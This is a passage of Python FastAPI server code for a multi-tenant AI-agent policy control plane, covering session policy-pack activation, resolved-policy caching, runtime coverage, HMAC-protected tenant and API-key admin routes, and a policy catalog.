        and scope both the builtin visibility check and the store
        lookup accordingly, otherwise tenant A could activate a
        user-pack owned by tenant B by guessing the id.

        TOCTOU: this helper is intentionally called from inside the
        ``session_lock`` critical section in ``session_pack_activate``
        so a pack deleted between the existence check and the repo
        write cannot strand an orphaned id in
        ``session_active_packs.pack_ids``. External callers must
        preserve that invariant.
        """
        from ..policy.pack import builtin_pack_spec_by_id
        if not isinstance(pack_id, str) or not pack_id:
            return False
        if pack_id.startswith("pack/"):
            return builtin_pack_spec_by_id(pack_id) is not None
        if pack_id.startswith("user-pack/"):
            if pack_store is None:
                return False
            for row in pack_store.load():
                if row.id == pack_id:
                    return True
            return False
        return False

    def _floor_pack_id(rows: list) -> str | None:
        for r in rows:
            if getattr(r, "is_floor", False):
                return r.id
        return None

    async def _resolve_floor(tenant_id: str) -> str | None:
        """Return the floor pack id, seeding one lazily. Returns None
        only when the pack store is not wired (self-host misconfig).
        """
        if pack_store is None:
            return None
        return await ensure_floor_pack_async(
            tenant_id, pack_store, pack_store_lock,
        )

    def _envelope(row, floor_pack_id: str | None) -> dict:
        """Wire envelope for GET + write responses. Always returns the
        floor pack id alongside the caller-scoped active list so the
        client can render the "always-on" chip without a second call.
        """
        if row is None:
            return {
                "active_packs": [],
                "floor_pack_id": floor_pack_id,
                "activated_at": None,
                "last_seen_at": None,
            }
        return {
            "active_packs": list(row.pack_ids or []),
            "floor_pack_id": floor_pack_id,
            "activated_at": row.activated_at,
            "last_seen_at": row.last_seen_at,
        }

    @app.post(
        "/session/{session_id}/packs/activate",
        dependencies=[Depends(require_tenant_auth)],
    )
    async def session_pack_activate(
        session_id: str, request: Request,
        body: dict = Body(...),
    ) -> dict:
        tenant_id = request.state.tenant_id
        if not isinstance(body, dict):
            raise HTTPException(422, "body must be a JSON object")
        pack_id = body.get("pack_id")
        if not isinstance(pack_id, str) or not pack_id:
            raise HTTPException(422, "pack_id is required")
        # Decision 7: the floor pack is always-on and server-locked. It
        # is never a session-activatable id. Reject activation
        # symmetrically with the deactivate lock (which returns 400
        # ``floor_pack_locked``) so activate and deactivate present a
        # consistent contract. Without this guard the floor id passes
        # ``_pack_exists`` (it is a real ``user-pack/…`` row), gets
        # appended to ``pack_ids``, and can then never be removed because
        # deactivate rejects it — a one-way door that strands the id in
        # the active list. Resolve the floor BEFORE the lock, matching
        # ``session_pack_deactivate``, so a stray attempt is a clean 400
        # that never touches the session row.
        floor_pack_id = await _resolve_floor(tenant_id)
        if floor_pack_id is not None and pack_id == floor_pack_id:
            raise HTTPException(
                400,
                {
                    "error": "floor_pack_always_on",
                    "message": (
                        "The tenant's floor pack is always active and "
                        "cannot be session-activated. Its policies fire "
                        "on every session regardless; edit its membership "
                        "through the pack detail endpoint instead."
                    ),
                    "floor_pack_id": floor_pack_id,
                },
            )
        repo = SessionActivePacksRepo(engine)
        # TOCTOU: the pack-exists check MUST happen inside the same
        # critical section as ``repo.activate`` so a pack deleted
        # between the check and the write cannot strand an orphaned id
        # in ``session_active_packs.pack_ids``. See ``_pack_exists``.
        async with session_lock:
            if not _pack_exists(pack_id):
                raise HTTPException(404, f"pack {pack_id!r} not found")
            row, _changed = repo.activate(session_id, tenant_id, pack_id)
        envelope = _envelope(row, floor_pack_id)
        envelope["session_id"] = session_id
        return envelope

    @app.post(
        "/session/{session_id}/packs/deactivate",
        dependencies=[Depends(require_tenant_auth)],
    )
    async def session_pack_deactivate(
        session_id: str, request: Request,
        body: dict = Body(...),
    ) -> dict:
        tenant_id = request.state.tenant_id
        if not isinstance(body, dict):
            raise HTTPException(422, "body must be a JSON object")
        pack_id = body.get("pack_id")
        if not isinstance(pack_id, str) or not pack_id:
            raise HTTPException(422, "pack_id is required")
        # Decision 7: floor pack cannot be deactivated. Resolve BEFORE
        # touching the session row so a stray attempt is a clean 400 and
        # leaves ``last_seen_at`` untouched.
        floor_pack_id = await _resolve_floor(tenant_id)
        if floor_pack_id is not None and pack_id == floor_pack_id:
            raise HTTPException(
                400,
                {
                    "error": "floor_pack_locked",
                    "message": (
                        "The tenant's floor pack cannot be deactivated. "
                        "The floor pack's membership is editable "
                        "through the pack detail endpoint but the "
                        "always-on bit is server-locked."
                    ),
                    "floor_pack_id": floor_pack_id,
                },
            )
        repo = SessionActivePacksRepo(engine)
        async with session_lock:
            row, _changed = repo.deactivate(session_id, tenant_id, pack_id)
        envelope = _envelope(row, floor_pack_id)
        envelope["session_id"] = session_id
        return envelope

    @app.get(
        "/session/{session_id}/packs",
        dependencies=[Depends(require_tenant_auth)],
    )
    async def session_pack_get(session_id: str, request: Request) -> dict:
        tenant_id = request.state.tenant_id
        # Lazily seed the floor pack on any read so a fresh tenant sees
        # a coherent envelope on the first GET (per decision 6 the pack
        # ships empty; ``ensure_floor_pack_async`` is idempotent).
        floor_pack_id = await _resolve_floor(tenant_id)
        repo = SessionActivePacksRepo(engine)
        row = repo.touch(session_id, tenant_id)
        envelope = _envelope(row, floor_pack_id)
        envelope["session_id"] = session_id
        return envelope

    # ── P2 gate-cache feeder: fold pack membership → policies_by_hook ──
    def _build_pack_member_lookup() -> Callable[[str], list[str]]:
        """Return a ``pack_id -> [policy_id, ...]`` lookup closure that
        loads ``pack_store`` at most ONCE per request.

        Cost note: the closure is called per pack in the assembled
        active list, per hook coordinate. Under the pre-hoist shape
        ``_pack_members`` re-invoked ``pack_store.load()`` on every
        call, so a moderate-size install (50 policies × 10 packs ×
        N coords) paid a full store load per (coord, pack) pair. Hoisting
        the load into a dict lookup keeps the total store work at
        O(1) per request and the resolution at O(coords × packs) with
        a dict-lookup constant.
        """
        from ..policy.pack import (
            _builtin_member_ids, builtin_pack_spec_by_id,
        )
        # Load user packs ONCE per request. Empty index when the store
        # is not wired (self-host misconfig) — matches the pre-hoist
        # "return []" branch.
        user_pack_index: dict[str, list[str]] = {}
        if pack_store is not None:
            for row in pack_store.load():
                user_pack_index[row.id] = list(row.policy_ids)

        def _lookup(pack_id: str) -> list[str]:
            if not isinstance(pack_id, str) or not pack_id:
                return []
            spec = builtin_pack_spec_by_id(pack_id)
            if spec is not None:
                return _builtin_member_ids(spec)
            if pack_id.startswith("user-pack/"):
                return list(user_pack_index.get(pack_id, ()))
            return []

        return _lookup

    def _read_only_floor_pack_id() -> str | None:
        """Read the floor pack id WITHOUT triggering a lazy seed write.

        Used by the flag-OFF branch of ``/session/{id}/resolved`` so
        that URL is not a reachable DB write surface under
        pack-centric-runtime=OFF. Returns None when no floor row is
        already present.
        """
        if pack_store is None:
            return None
        for row in pack_store.load():
            if getattr(row, "is_floor", False):
                return row.id
        return None

    @app.get(
        "/session/{session_id}/resolved",
        dependencies=[Depends(require_tenant_auth)],
    )
    async def session_pack_resolved(
        session_id: str, request: Request,
    ) -> dict:
        """P2 gate-cache feeder.

        Return the pre-folded policy map the gate binary caches for a
        single ``(session_id, tenant_id)`` pair. Response shape::

            {
              "session_id": str,
              "tenant_id":  str,   # so a caller can round-trip the row
              "active_packs":  [pack_id, ...],   # activation-order
              "floor_pack_id": str | None,
              "pack_centric_enabled": bool,      # advisory (matches env)
              "policies_by_hook": [
                {"event": str, "matcher": str | None,
                 "policies": [<serialized_policy>, ...]},
                ...
              ]
            }

        Behavior mirrors the resolver library so the flag-OFF path
        returns the SAME set of policies for a given hook that the
        legacy runtime path would return today. That symmetry is what
        makes the runtime cut-over a pure caching change instead of a
        semantic change (see plan doc Phase 2).

        Under flag-OFF: returns every enabled policy grouped by
        (event, matcher), IGNORING active_packs. Fresh gates seeing a
        flag-OFF cloud can consume the same envelope without a
        branchy decode.

        Under flag-ON: only policies whose id belongs to (floor ∪
        activated packs) survive; the per-policy ``enabled`` bit is
        ignored per the plan doc's runtime section. Order is
        deterministic: ``policies_by_hook`` iteration follows the
        (event, matcher) first-seen order over the pack-walk, so a
        floor pack member always precedes an activated pack member on
        the same hook.
        """
        from ..policy.resolver import (
            extract_event_matcher,
            legacy_resolve_policies_for_hook,
            pack_centric_enabled,
            resolve_policies_for_hook,
        )
        tenant_id = request.state.tenant_id
        # Zero-downtime guard (P5 fail-open fix): the global env flag says
        # "pack-centric is the default", but the pack-centric path only
        # fires policies that live in a pack. If the best-effort boot
        # migration never populated THIS tenant's floor (corrupt/locked
        # store, disk error, permanent per-tenant failure), its
        # `pack_centric_migrated_at` stamp is NULL and its floor is empty
        # — resolving under pack-centric would silently return zero
        # policies for every hook, a total governance bypass. So a tenant
        # is treated as pack-centric ONLY when the global flag is on AND
        # its migration is confirmed complete; otherwise we fall back to
        # the legacy per-policy `enabled` resolver so yesterday's enabled
        # set still fires today (fail-closed against silent bypass).
        flag_on = pack_centric_enabled() and _tenant_pack_centric_migrated(
            engine, tenant_id,
        )
        # Flag-neutrality: this endpoint is REGISTERED under both flag
        # settings so smoke probes + dashboards can render envelope
        # shape without a mode flip. But side-effects (floor-pack seed
        # writes, session_active_packs row touches) MUST NOT happen
        # under flag-OFF, otherwise "flag-OFF is byte-identical" only
        # holds on the response body while the DB drifts. Split the
        # code into two branches for read-vs-write clarity.
        if flag_on:
            # Ensure the floor exists so the envelope always carries an
            # id under pack-centric semantics (mirrors GET
            # /session/{id}/packs).
            floor_pack_id = await _resolve_floor(tenant_id)
            repo = SessionActivePacksRepo(engine)
            row = repo.touch(session_id, tenant_id)
            active_packs = list(row.pack_ids) if row is not None else []
        else:
            # Read-only lookup: no lazy seed, no repo.touch. If the
            # floor row already exists we surface its id (helpful for
            # dashboard preview). Otherwise None — the flag-ON branch
            # will materialise it on the first real pack-centric read.
            floor_pack_id = _read_only_floor_pack_id()
            active_packs = []
        overrides = policy_store.load() if policy_store is not None else []

        # Collect the hook coordinates we need to answer for. Two
        # sources:
        #   (a) every event/matcher pair present on any override —
        #       gives the flag-OFF envelope 1:1 parity with today's
        #       linear-scan gate.
        #   (b) every event/matcher pair reachable via the pack union
        #       under flag-ON. Under flag-OFF this is a subset of (a),
        #       so we just take the union without branching.
        coord_seen: set[tuple[str, str | None]] = set()
        coord_order: list[tuple[str, str | None]] = []
        for ov in overrides:
            coord = extract_event_matcher(ov.policy)
            if coord[0] is None:
                continue
            if coord in coord_seen:
                continue
            coord_seen.add(coord)
            coord_order.append(coord)  # type: ignore[arg-type]

        # Hoist the pack-member lookup so pack_store is read at most
        # once per request. See ``_build_pack_member_lookup`` docstring.
        pack_member_lookup = (
            _build_pack_member_lookup() if flag_on else (lambda _pid: [])
        )

        policies_by_hook: list[dict] = []
        for event, matcher in coord_order:
            if flag_on:
                matched = resolve_policies_for_hook(
                    session_id=session_id, tenant_id=tenant_id,
                    event=event, matcher=matcher,
                    overrides=overrides,
                    active_packs=active_packs,
                    floor_pack_id=floor_pack_id,
                    pack_member_lookup=pack_member_lookup,
                )
            else:
                matched = legacy_resolve_policies_for_hook(
                    overrides, event, matcher,
                )
            if not matched:
                # Under flag-ON a coord that no pack covers yields an
                # empty list; drop it from the envelope so the gate
                # cache doesn't grow O(all_events) empty slots per
                # session. Under flag-OFF an empty list means every
                # override on the coord is disabled — same treatment.
                continue
            policies_by_hook.append({
                "event": event,
                "matcher": matcher,
                "policies": [_serialize_policy_for_api(p) for p in matched],
            })

        return {
            "session_id": session_id,
            "tenant_id": tenant_id,
            "active_packs": active_packs,
            "floor_pack_id": floor_pack_id,
            "pack_centric_enabled": flag_on,
            "policies_by_hook": policies_by_hook,
        }

    # ── P4 dashboard feeder: recent sessions + their active packs ─────
    @app.get(
        "/admin/sessions",
        dependencies=[Depends(require_admin_key)],
    )
    async def admin_list_sessions(
        request: Request, limit: int = 100,
    ) -> dict:
        """P4 ``/sessions`` dashboard tab feeder.

        Return the tenant's recent CC sessions with their currently-
        active pack ids so the operator can see "who left which pack on"
        and force-deactivate from the dashboard. Admin-key gated (same
        surface every other dashboard read uses).

        Tenant scoping (decision 8 — single-tenant beta): the admin key
        is not tenant-bound, so the caller selects the tenant via an
        optional ``?tenant_id=`` query, defaulting to the synthetic
        ``default`` tenant that a single-machine docker-compose install
        writes its session rows under. Phase 5's per-tenant admin auth
        will replace the query param with a bound tenant.

        The floor pack id is resolved read-only (no lazy seed write on a
        GET) so this route is not a hidden DB-write surface. Each row's
        ``active_packs`` carries only the session-activated packs; the
        floor pack is surfaced once at the envelope level for the
        "ALWAYS-ON" chip.
        """
        tenant_id = request.query_params.get("tenant_id") or "default"
        floor_pack_id = _read_only_floor_pack_id()
        repo = SessionActivePacksRepo(engine)
        rows = repo.list_by_tenant(tenant_id, limit=limit)
        items = [
            {
                "session_id": r.session_id,
                "tenant_id": r.tenant_id,
                # Codex runtime adapter (P4): which runtime this session
                # belongs to. Defaults to "claude-code" for every
                # pre-adapter row (server default on the column).
                "runtime_id": getattr(r, "runtime_id", None) or "claude-code",
                "active_packs": list(r.pack_ids or []),
                "activated_at": r.activated_at,
                "last_seen_at": r.last_seen_at,
                "expires_at": r.expires_at,
                "floor_pack_id": floor_pack_id,
            }
            for r in rows
        ]
        return {
            "items": items,
            "tenant_id": tenant_id,
            "floor_pack_id": floor_pack_id,
        }


def _attach_runtime_routes(
    app: FastAPI, engine, *,
    policy_store: "PolicyStore | None",
    pack_store: "PackStore | None",
) -> None:
    """Codex runtime adapter (P4): per-runtime coverage + per-tenant
    runtime preference for the dashboard runtime picker.

    Design brief: docs/plans/2026-06-30-codex-runtime-adapter-design.md
    Section 7. Everything here is READ-safe; only the
    ``POST /tenants/{id}/runtime`` switch to ``codex`` is gated on
    ``MAGI_CP_CODEX_RUNTIME_ENABLED`` (default ON; the switch is refused
    only when the flag is set to an explicit falsy value).

    Routes:
      - GET  /policies/{policy_id}/coverage/{runtime_id}  - per-policy strip
      - GET  /packs/{pack_id}/coverage/{runtime_id}       - per-pack rollup
      - GET  /tenants/{tenant_id}/runtime                 - picker state
      - POST /tenants/{tenant_id}/runtime                 - switch runtime

    All coverage reads reuse ``HookRuntime.coverage_report`` (P1) so the
    dashboard never re-derives coverage semantics.
    """
    from ..config import codex_runtime_enabled
    from ..policy.pack import builtin_pack_spec_by_id, _builtin_member_ids
    from ..policy.prebuilt import build_prebuilt_evidence_policy
    from ..runtime import get_runtime, rollup_cells
    from ..runtime.trait import coverage_cell
    from .tenants import TenantRepo

    _KNOWN_RUNTIMES = ("claude-code", "codex")

    def _canonical_runtime(runtime_id: str) -> str | None:
        """Map a URL runtime token onto a canonical id, or None when
        unknown (so the caller can 404)."""
        key = (runtime_id or "").strip().lower()
        if key in ("cc", "claude-code", "claude_code", "claudecode"):
            return "claude-code"
        if key == "codex":
            return "codex"
        return None

    def _policy_ir_by_id(policy_id: str):
        """Resolve a policy id to its IR: operator-saved store row first,
        then the prebuilt catalog (so built-in pack members resolve too).
        Returns None when neither knows the id."""
        if policy_store is not None:
            for ov in policy_store.load():
                if ov.policy.id == policy_id:
                    return ov.policy
        return build_prebuilt_evidence_policy(policy_id)

    def _all_store_ir() -> list:
        """The catalog the per-tenant picker rollup measures coverage
        against: operator-saved policies PLUS the members of the
        always-on floor pack.

        A pack-centric tenant can run with an empty ``policy_store``
        while all enforcement flows from the built-in floor pack.
        Counting store rows alone would make the picker under-report
        ("0 policies enforced") even as the per-pack rollup cards show
        the real non-zero counts. Resolving floor-pack members through
        ``_policy_ir_by_id`` (store row first, prebuilt catalog
        fallback) keeps the picker total aligned with those cards.
        Deduped by policy id so a member that is also an operator-saved
        row is counted exactly once."""
        seen: set[str] = set()
        out: list = []
        if policy_store is not None:
            for ov in policy_store.load():
                if ov.policy.id not in seen:
                    seen.add(ov.policy.id)
                    out.append(ov.policy)
        if pack_store is not None:
            for row in pack_store.load():
                if not getattr(row, "is_floor", False):
                    continue
                for mid in row.policy_ids:
                    if mid in seen:
                        continue
                    ir = _policy_ir_by_id(mid)
                    if ir is not None:
                        seen.add(mid)
                        out.append(ir)
        return out

    def _resolve_pack_member_ids(pack_id: str) -> list[str] | None:
        """Ordered member policy ids for a pack, or None when unknown.
        Mirrors ``_attach_policy_routes._resolve_pack_members`` (kept
        local so the runtime routes carry no dependency on that closure)."""
        spec = builtin_pack_spec_by_id(pack_id)
        if spec is not None:
            return _builtin_member_ids(spec)
        if pack_id.startswith("user-pack/") and pack_store is not None:
            for row in pack_store.load():
                if row.id == pack_id:
                    return list(row.policy_ids)
        return None

    @app.get(
        "/policies/{policy_id:path}/coverage/{runtime_id}",
        dependencies=[Depends(require_admin_key)],
    )
    def policy_coverage(policy_id: str, runtime_id: str) -> dict:
        canonical = _canonical_runtime(runtime_id)
        if canonical is None:
            raise HTTPException(404, f"unknown runtime {runtime_id!r}")
        ir = _policy_ir_by_id(policy_id)
        if ir is None:
            raise HTTPException(404, f"policy {policy_id!r} not found")
        report = get_runtime(canonical).coverage_report([ir])
        status = report.policies[0]
        return {
            "policy_id": policy_id,
            "runtime_id": canonical,
            "status": status.status,
            "downgrade": status.downgrade,
            "coverage": coverage_cell(status.status, status.downgrade),
        }

    @app.get(
        "/packs/{pack_id:path}/coverage/{runtime_id}",
        dependencies=[Depends(require_admin_key)],
    )
    def pack_coverage(pack_id: str, runtime_id: str) -> dict:
        canonical = _canonical_runtime(runtime_id)
        if canonical is None:
            raise HTTPException(404, f"unknown runtime {runtime_id!r}")
        member_ids = _resolve_pack_member_ids(pack_id)
        if member_ids is None:
            raise HTTPException(404, f"pack {pack_id!r} not found")
        ir = [p for p in (_policy_ir_by_id(m) for m in member_ids)
              if p is not None]
        report = get_runtime(canonical).coverage_report(ir)
        rollup = rollup_cells(report)
        rollup["pack_id"] = pack_id
        return rollup

    def _runtime_rollup(canonical: str) -> dict:
        report = get_runtime(canonical).coverage_report(_all_store_ir())
        rollup = rollup_cells(report)
        rollup["id"] = canonical
        # The whole-catalog picker rollup does not need the per-policy
        # detail list; drop it to keep the picker payload small.
        rollup.pop("policies", None)
        return rollup

    @app.get(
        "/tenants/{tenant_id}/runtime",
        dependencies=[Depends(require_admin_key)],
    )
    def get_tenant_runtime(tenant_id: str) -> dict:
        repo = TenantRepo(engine)
        current = repo.get_runtime(tenant_id)
        return {
            "tenant_id": tenant_id,
            "runtime_id": current,
            "codex_enabled": codex_runtime_enabled(),
            "runtimes": [_runtime_rollup(r) for r in _KNOWN_RUNTIMES],
        }

    @app.post(
        "/tenants/{tenant_id}/runtime",
        dependencies=[Depends(require_admin_key)],
    )
    async def set_tenant_runtime(tenant_id: str, request: Request) -> dict:
        # Parse the body manually: a closure-local Pydantic model is not
        # resolvable by FastAPI under `from __future__ import annotations`
        # (the annotation is a string looked up in module globals, where
        # a local class does not live), so it would be mis-read as a
        # query param. Manual parse keeps the route self-contained.
        try:
            payload = await request.json()
        except Exception:
            raise HTTPException(400, "invalid json body")
        if not isinstance(payload, dict):
            raise HTTPException(400, "body must be an object")
        requested = payload.get("runtime_id")
        if not isinstance(requested, str) or not requested.strip():
            raise HTTPException(400, "runtime_id required")
        canonical = _canonical_runtime(requested)
        if canonical is None:
            raise HTTPException(400, f"unknown runtime {requested!r}")
        # Feature-flag ladder (Section 9.3): the global kill switch gates
        # any switch TO codex. Switching back to claude-code is always
        # allowed so an operator can revert even on a build where the
        # flag was later turned off.
        if canonical == "codex" and not codex_runtime_enabled():
            raise HTTPException(
                403,
                "codex runtime disabled: MAGI_CP_CODEX_RUNTIME_ENABLED is set "
                "to an explicit falsy value (unset it to re-enable; default ON)",
            )
        TenantRepo(engine).set_runtime(tenant_id, runtime_id=canonical)
        return {"tenant_id": tenant_id, "runtime_id": canonical}


def _attach_admin_tenant_routes(app: FastAPI, engine) -> None:
    """HMAC-authenticated admin routes for tenant/key lifecycle.

    Called by clawy's Stripe webhook (on subscription start/cancel/etc) and by
    the clawy dashboard's "create API key" button (server action → HMAC POST).
    Auth is HMAC-SHA256 over the raw request body — caller signs with the
    shared `MAGI_CP_ADMIN_HMAC_SECRET` env var.

    No bearer token: webhooks fire from many IPs, HMAC over body is the safer
    surface (replay-resistant + body-tamper-resistant in one check).
    """
    from .tenants import ApiKeyRepo, TenantRepo

    async def require_hmac(request: Request) -> bytes:
        import hmac as _hmac
        import hashlib as _hashlib
        secret = os.environ.get("MAGI_CP_ADMIN_HMAC_SECRET")
        if not secret:
            raise HTTPException(503, "admin hmac not configured")
        body = await request.body()
        presented = request.headers.get("x-magi-signature") or ""
        expected = _hmac.new(
            secret.encode("utf-8"), body, _hashlib.sha256,
        ).hexdigest()
        if not _hmac.compare_digest(presented, expected):
            raise HTTPException(401, "invalid admin signature")
        return body

    class _CreateTenantIn(BaseModel):
        tenant_id: str = Field(..., min_length=1, max_length=64,
                                pattern=r"^[A-Za-z0-9_\-:]+$")
        plan: str = Field(default="free", max_length=32)
        expires_at: int | None = None

    class _SuspendIn(BaseModel):
        reason: str = Field(..., min_length=1, max_length=128)

    @app.post("/admin/tenants")
    async def admin_create_tenant(request: Request) -> dict:
        await require_hmac(request)
        # Parse body after HMAC verification — guards against any
        # parsing-side timing channel.
        try:
            data = await request.json()
        except Exception:
            raise HTTPException(422, "invalid JSON body")
        try:
            payload = _CreateTenantIn(**data)
        except Exception as e:
            raise HTTPException(422, f"invalid payload: {e}")
        repo = TenantRepo(engine)
        # Idempotent: if tenant exists, return current record. The webhook
        # caller (clawy) might retry on transient failures.
        existing = repo.get(payload.tenant_id)
        if existing is not None:
            return {"id": existing.id, "status": existing.status,
                    "plan": existing.plan, "expires_at": existing.expires_at}
        t = repo.create(
            tenant_id=payload.tenant_id, plan=payload.plan,
            expires_at=payload.expires_at,
        )
        return {"id": t.id, "status": t.status, "plan": t.plan,
                "expires_at": t.expires_at}

    @app.post("/admin/tenants/{tenant_id}/suspend")
    async def admin_suspend_tenant(tenant_id: str, request: Request) -> dict:
        await require_hmac(request)
        try:
            data = await request.json()
        except Exception:
            data = {}
        try:
            payload = _SuspendIn(**data)
        except Exception:
            raise HTTPException(422, "reason is required")
        repo = TenantRepo(engine)
        try:
            repo.suspend(tenant_id, reason=payload.reason)
        except KeyError:
            raise HTTPException(404, f"tenant {tenant_id!r} not found")
        t = repo.get(tenant_id)
        return {"id": t.id, "status": t.status}

    @app.post("/admin/tenants/{tenant_id}/reactivate")
    async def admin_reactivate_tenant(tenant_id: str, request: Request) -> dict:
        await require_hmac(request)
        repo = TenantRepo(engine)
        try:
            repo.reactivate(tenant_id)
        except KeyError:
            raise HTTPException(404, f"tenant {tenant_id!r} not found")
        t = repo.get(tenant_id)
        return {"id": t.id, "status": t.status}

    @app.post("/admin/tenants/{tenant_id}/keys")
    async def admin_issue_key(tenant_id: str, request: Request) -> dict:
        await require_hmac(request)
        tenant_repo = TenantRepo(engine)
        if tenant_repo.get(tenant_id) is None:
            raise HTTPException(404, f"tenant {tenant_id!r} not found")
        issued = ApiKeyRepo(engine).issue(tenant_id=tenant_id)
        # Cleartext returned ONCE — caller (clawy dashboard) shows once.
        return {"id": issued.id, "tenant_id": issued.tenant_id,
                "api_key": issued.cleartext, "prefix": issued.prefix}

    @app.post("/admin/tenants/{tenant_id}/keys/{key_id}/revoke")
    async def admin_revoke_key(tenant_id: str, key_id: int,
                                request: Request) -> dict:
        await require_hmac(request)
        repo = ApiKeyRepo(engine)
        try:
            repo.revoke(key_id)
        except KeyError:
            raise HTTPException(404, f"key {key_id} not found")
        return {"id": key_id, "revoked": True}


def _resolve_llm_provider_from_env(env_var: str) -> "object | None":
    """Load an LlmProvider via a dotted import path in env.

    Format: `MAGI_CP_LLM_COMPILER=mypkg.module:factory_callable`. The callable
    receives no args and must return something conforming to LlmProvider.
    Returns None when the env var is unset — keeps /policies/compile honest
    about its 503 path (and the test suite stays hermetic).
    """
    spec = os.environ.get(env_var)
    if not spec:
        return None
    if ":" not in spec:
        raise RuntimeError(
            f"{env_var} must be 'module.path:callable', got {spec!r}"
        )
    mod_path, _, attr = spec.partition(":")
    import importlib
    try:
        mod = importlib.import_module(mod_path)
    except Exception as e:
        raise RuntimeError(f"{env_var}: failed to import {mod_path}: {e}") from e
    if not hasattr(mod, attr):
        raise RuntimeError(f"{env_var}: {mod_path} has no attribute {attr!r}")
    factory = getattr(mod, attr)
    return factory()


def _attach_catalog_routes(
    app: FastAPI,
    policy_store: PolicyStore,
    verifier_registry: VerifierRegistry | None,
    custom_verifier_store: "CustomVerifierStore | None" = None,
) -> None:
    """Derived (read-only) catalog: evidence types + conditions.

    Pure-derivation model — there is no separate storage. The catalog
    walks the live state every request:

      Evidence types  = (built-in verifier registry steps) ∪
                        (tenant-scoped custom verifier rows) ∪
                        (step referenced in any policy's requires[])
      Conditions      = (sentinel_re pattern of every policy) ∪
                        (tool matchers from every policy's trigger)

    Both are tenant-scoped because the policy list is. Custom verifier
    rows are merged in per-tenant so the operator who POSTs a row to
    /custom-verifiers and is redirected to /rules?tab=evidence sees their
    new entry on landing (instead of a "green flash but no row" gap).
    Users cannot write to either tab; entries appear/disappear as the
    policies / custom rows that reference them are saved/deleted
    (mirrors the magi-agent customize refactor — Policy is the only
    first-class entity).
    """

    @app.get("/catalog/evidence-types", dependencies=[Depends(require_tenant_auth)])
    def list_evidence_types(request: Request) -> dict:
        builtin: list[dict] = []
        builtin_steps: set[str] = set()
        if verifier_registry is not None:
            for v in verifier_registry.all():
                builtin.append({
                    "step": v.step,
                    "category": v.category,
                    "description": v.description,
                    "enforcement": v.enforcement.value,
                    "name": getattr(v, "name", None),
                    "source": "builtin",
                    "used_by_policies": [],
                })
                builtin_steps.add(v.step)
        used_by: dict[str, list[str]] = {}
        # Track which inline kinds (regex / llm_critic / shacl) appear in
        # any stored policy so we can inject the synthetic catalog rows
        # below. The /verify_inline route writes `inline_<kind>` as the
        # ledger step label, so the chip selector + emissions widget can
        # surface inline kinds via the same machinery as step-kind rows.
        used_by_inline: dict[str, list[str]] = {}
        for entry in policy_store.load():
            for req in entry.policy.requires:
                kind = getattr(req, "kind", "step")
                if kind == "step":
                    # D52c follow-up: skip empty step names. Inline-kind
                    # rows previously fell through to `used_by[""]`
                    # which produced a `step=""` catalog row and a
                    # dead `/ledger?verifier=` chip; explicit kind
                    # check above + this defensive guard keeps the
                    # catalog clean even if loader semantics shift.
                    if req.step:
                        used_by.setdefault(req.step, []).append(entry.policy.id)
                elif kind in ("regex", "llm_critic", "shacl"):
                    used_by_inline.setdefault(
                        f"inline_{kind}", [],
                    ).append(entry.policy.id)
        for row in builtin:
            row["used_by_policies"] = used_by.pop(row["step"], [])

        custom: list[dict] = []
        if custom_verifier_store is not None:
            tenant_id = getattr(request.state, "tenant_id", "default")
            for cv in custom_verifier_store.list_for_tenant(tenant_id):
                # Custom rows shadow nothing — they live in a separate
                # `source` bucket so the operator can tell at a glance
                # which entries came from their own /verifiers/new
                # authoring vs the cloud's built-in registry.
                used_by_this = used_by.pop(cv.name, [])
                # D52d follow-up: surface the author-supplied
                # field_checks the operator typed into /verifiers/new.
                # Without this projection the catalog row could only
                # ever render the "preview mode" placeholder for
                # custom verifiers, defeating the field_checks editor
                # the operator just used. The dashboard's
                # VerifierFieldChecks accepts a descriptorOverride prop
                # off this field for source='custom' rows.
                custom.append({
                    "step": cv.name,
                    "category": None,
                    "description": cv.description,
                    "enforcement": "preview",
                    "name": cv.name,
                    "source": "custom",
                    "used_by_policies": used_by_this,
                    "field_checks": [
                        {
                            "path": fc.path,
                            "check_description": fc.check_description,
                        }
                        for fc in cv.field_checks
                    ],
                })

        derived: list[dict] = []
        for step, policies in sorted(used_by.items()):
            # Defense-in-depth: skip any step that survived to here with
            # a falsy name (would produce a `?verifier=` chip with no
            # body and a React key collision on duplicates).
            if not step:
                continue
            derived.append({
                "step": step,
                "category": None,
                "description": "Referenced by a policy but not bound to "
                               "any built-in verifier — runs will deny "
                               "with no-verifier-registered.",
                "enforcement": "missing",
                "name": None,
                "source": "policy-derived",
                "used_by_policies": policies,
            })

        # D52c follow-up: synthetic catalog rows for inline kinds.
        # /verify_inline writes `body['step'] = inline_<kind>` to the
        # ledger; without these synthetic rows the chip selector +
        # emissions widget have no way to filter or count those
        # entries. We emit at most one row per inline kind (regex /
        # llm_critic / shacl) and only when at least one stored policy
        # uses that kind, so the catalog stays focused.
        _INLINE_KIND_DESCRIPTIONS = {
            "inline_regex": (
                "Inline regex check authored in a policy's requires list. "
                "Emits to the ledger as step=`inline_regex` on every "
                "evaluation; not registerable via /verifiers/new."
            ),
            "inline_llm_critic": (
                "Inline llm_critic check authored in a policy's requires "
                "list. Emits to the ledger as step=`inline_llm_critic`."
            ),
            "inline_shacl": (
                "Inline SHACL shape authored in a policy's requires list. "
                "Emits to the ledger as step=`inline_shacl`."
            ),
        }
        inline_rows: list[dict] = []
        for step in sorted(used_by_inline.keys()):
            inline_rows.append({
                "step": step,
                "category": None,
                "description": _INLINE_KIND_DESCRIPTIONS.get(
                    step,
                    "Inline policy check; emits under this step label.",
                ),
                "enforcement": "enforcing",
                "name": None,
                # `policy-derived` so the UI's per-source visual
                # treatment surfaces these as "not authored at
                # /verifiers/new" (matches the operator's mental model
                # (they live in a policy, not a verifier).
                "source": "policy-derived",
                "used_by_policies": used_by_inline[step],
            })

        return {"items": builtin + custom + inline_rows + derived}

    @app.get("/catalog/conditions", dependencies=[Depends(require_tenant_auth)])
    def list_conditions() -> dict:
        items: list[dict] = []
        for entry in policy_store.load():
            p = entry.policy
            items.append({
                "kind": "sentinel_re",
                "value": p.sentinel_re,
                "policy_id": p.id,
                "trigger_event": p.trigger.event,
                "tool_matcher": p.trigger.matcher,
            })
            items.append({
                "kind": "tool_match",
                "value": p.trigger.matcher,
                "policy_id": p.id,
                "trigger_event": p.trigger.event,
                "tool_matcher": p.trigger.matcher,
            })
            # D35: surface kind=regex / llm_critic / shacl conditions
            # extracted from each policy's requires list. step kind is
            # already surfaced via evidence-types catalog.
            for req in p.requires:
                if req.kind == "regex":
                    items.append({
                        "kind": "regex",
                        "value": req.pattern,
                        "policy_id": p.id,
